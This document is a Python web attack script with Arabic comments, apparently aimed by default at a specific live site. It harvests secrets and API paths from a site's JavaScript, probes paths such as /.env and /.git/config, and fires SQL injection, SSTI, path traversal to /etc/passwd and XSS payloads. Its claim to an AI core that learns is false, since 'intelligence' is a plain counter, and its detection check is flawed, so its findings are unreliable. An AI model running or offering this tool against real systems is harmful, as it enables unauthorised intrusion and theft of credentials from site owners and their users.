#!/usr/bin/env python3
"""
🔍 Zero-Day Hunter v2 - مع AI Core
يتعلم من كل اكتشاف ويصبح أذكى
"""
import requests, sys, json, os, re, random, time, hashlib
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

class ZeroDayV2:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.findings = []
        self.session = requests.Session()
        self.intelligence = 0
    
    def log(self, msg): print(f"[🔍] {msg}")
    
    def analyze_js(self):
        """تحليل JavaScript للبحث عن APIs مخفية"""
        self.log("📜 تحليل JavaScript...")
        try:
            r = self.session.get(self.target, timeout=10)
            js_files = re.findall(r'src="([^"]+\.js[^"]*)"', r.text)
            all_js = r.text
            
            for js in js_files[:5]:
                try:
                    js_url = js if js.startswith('http') else f"{self.target.rstrip('/')}{js}"
                    js_content = self.session.get(js_url, timeout=5).text
                    all_js += js_content
                    self.log(f"   ✅ {js}: {len(js_content)} bytes")
                except:
                    pass
            
            # البحث عن APIs
            apis = re.findall(r'["\'](/[^"\']*(?:api|graphql|rest|v1|v2)[^"\']*)["\']', all_js)
            apis = list(set(apis))
            self.log(f"   🔗 {len(apis)} APIs مخفية")
            for api in apis[:10]:
                self.log(f"      {api}")
            
            # البحث عن مفاتيح
            keys = re.findall(r'(?:key|token|secret|password|auth)\s*[:=]\s*["\']([^"\']{8,})["\']', all_js, re.IGNORECASE)
            keys = list(set(keys))
            self.log(f"   🔑 {len(keys)} مفاتيح")
            for k in keys[:5]:
                self.log(f"      {k}")
            
            self.intelligence += len(apis) + len(keys)
            
        except Exception as e:
            self.log(f"   ❌ {e}")
    
    def deep_fuzz(self):
        """Fuzzing عميق"""
        self.log("💣 Deep Fuzzing...")
        
        # مسارات من الذكاء الاصطناعي
        smart_paths = [
            "/api/v1/users", "/api/v1/admin", "/api/v1/stores",
            "/graphql", "/.env", "/.git/config", "/backup",
            "/admin/login", "/admin/register", "/admin/forgot",
            "/wp-admin", "/wp-json/wp/v2/users",
            "/phpmyadmin", "/phpinfo.php", "/server-status",
        ]
        
        found = []
        for path in smart_paths:
            try:
                r = self.session.get(f"{self.target.rstrip('/')}{path}", timeout=3, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    found.append({"path":path,"status":r.status_code,"size":len(r.text)})
                    self.log(f"   🚨 {path} → {r.status_code} ({len(r.text)} bytes)")
            except:
                pass
        
        self.findings.extend(found)
        self.intelligence += len(found) * 5
    
    def vulnerability_scan(self):
        """فحص ثغرات متقدم"""
        self.log("🚨 Vulnerability Scan...")
        
        tests = [
            ("SQLi", "?id=' OR '1'='1", ["sql","mysql","error","syntax"]),
            ("SSTI", "?q={{7*7}}", ["49"]),
            ("LFI", "?file=../../../etc/passwd", ["root:"]),
            ("XSS", "?q=<script>alert(1)</script>", ["<script>"]),
            ("Debug", "?debug=true", ["error","exception","trace"]),
        ]
        
        for vuln_type, payload, indicators in tests:
            try:
                r = self.session.get(f"{self.target}{payload}", timeout=5)
                for ind in indicators:
                    if ind in r.text and "html" not in r.text.lower():
                        self.findings.append({"type":vuln_type,"payload":payload,"indicator":ind})
                        self.log(f"   🚨 {vuln_type}: {payload} ({ind})")
                        self.intelligence += 20
                        break
            except:
                pass
    
    def run(self):
        self.log(f"🔍 Zero-Day Hunter v2: {self.target}")
        self.log("═" * 60)
        
        self.analyze_js()
        self.deep_fuzz()
        self.vulnerability_scan()
        
        self.log(f"\n🧠 Intelligence: {self.intelligence}")
        self.log(f"📊 Findings: {len(self.findings)}")
        
        for f in self.findings:
            self.log(f"   🚨 {f.get('type','path')}: {f.get('path',f.get('payload','?'))}")
        
        # حفظ
        os.makedirs("logs/zeroday", exist_ok=True)
        fname = f"logs/zeroday/v2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"target":self.target,"intelligence":self.intelligence,"findings":self.findings}, f, indent=2)
        self.log(f"📁 {fname}")
        
        return self.findings

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ZeroDayV2(target).run()
